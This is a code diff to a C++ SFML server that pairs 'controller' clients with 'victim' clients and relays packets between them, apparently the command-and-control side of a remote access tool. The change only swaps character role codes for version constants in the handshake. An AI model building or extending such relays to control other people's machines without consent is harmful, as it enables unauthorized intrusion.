@@ -63,18 +63,21 @@ void Server::receive()
 		//process the packet if it was received by an uninitialized client
 		else if (c.second.role == '-') {
 			//get the client's role and name
-			sf::Uint8 role;
-			p >> role;
+			sf::Uint8 version;
+			p >> version;
 			p >> c.second.name;
 			p.clear();
 
 			//add new controller/victim to the list
-			if (role == 'c' || role == 'v') {
-				p << sf::Uint8(role);
-				if (role == 'c')
-					p << sf::Uint16(c.first);
+			if (version == CONTROLLER_VERSION || version == VICTIM_VERSION) {
+				if (version == CONTROLLER_VERSION)
+					p << sf::Uint8(CONTROLLER_VERSION) << sf::Uint16(c.first);
+				else
+					p << sf::Uint8(VICTIM_VERSION);
+
 				//tell the client that it has been initialized
 				c.second.socket->send(p);
+				char role = (version == CONTROLLER_VERSION) ? 'c' : 'v';
 				c.second.role = role;
 
 				std::ofstream log(LOG_PATH, std::ios::app);
@@ -271,7 +274,7 @@ void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::U
 		updateControllersList();
 	}
 	//apparently controller thinks it isn't initialized
-	else if (cmd == 'c' || cmd == 'v') {
+	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
 		//reset controller's role and name
 		clients[id].role = '-';
 		clients[id].name = "";
@@ -309,7 +312,7 @@ void Server::processVictimMsg(sf::Uint16 id, sf::Packet p)
 		clients[clients[id].pair].socket->send(p);
 	}
 	//apparently victim thinks it isn't initialized
-	else if (cmd == 'c' || cmd == 'v') {
+	else if (cmd == CONTROLLER_VERSION || cmd == VICTIM_VERSION) {
 		//reset controller's role and name
 		clients[id].role = '-';
 		clients[id].name = "";
